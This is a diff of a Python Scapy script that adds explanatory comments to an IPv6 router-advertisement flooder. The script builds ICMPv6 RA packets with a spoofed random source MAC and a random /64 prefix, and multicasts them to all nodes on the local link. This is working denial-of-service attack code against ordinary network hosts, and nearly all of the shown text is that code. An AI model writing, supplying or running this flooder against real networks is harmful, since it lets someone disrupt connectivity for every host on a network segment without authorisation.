@@ -26,7 +26,7 @@ def banner():
           ''')
     return
 
-
+# Creates random mac #
 def randomMAC():
     mac = [ 0x00, 0x16, 0x3e,
     random.randint(0x00, 0x7f),
@@ -34,23 +34,25 @@ def randomMAC():
     random.randint(0x00, 0xff) ]
     return (':'.join(map(lambda x: "%02x" % x, mac)))
 
+# creates random prefix #
 def prefixi():
     prefix = [random.randint(0x00, 0xff),random.randint(0x00, 0xff)]
     return (''.join(map(lambda x: "%02x" % x, prefix)))
 
-
+# creates and sends the packet #
 def Multicast(newmac, prefix):
     a = IPv6()                  # create ipv6 object
     a.dst = "ff02::1"           # dest addr = ipv6 multicast to all nodes
     b = ICMPv6ND_RA()
     c = ICMPv6NDOptSrcLLAddr()
-    c.lladdr = newmac
+    c.lladdr = newmac           # c.lladdr spoofed source mac address
     d = ICMPv6NDOptMTU()
     e = ICMPv6NDOptPrefixInfo()
     e.prefixlen = 64
-    e.prefix = str(prefix+'::')
-    send(a/b/c/d/e, verbose=0)
+    e.prefix = str(prefix+'::') # sets new prefix
+    send(a/b/c/d/e, verbose=0)  # Sends multicast packet
 
+# main loop #
 def main():
     try:
         banner()
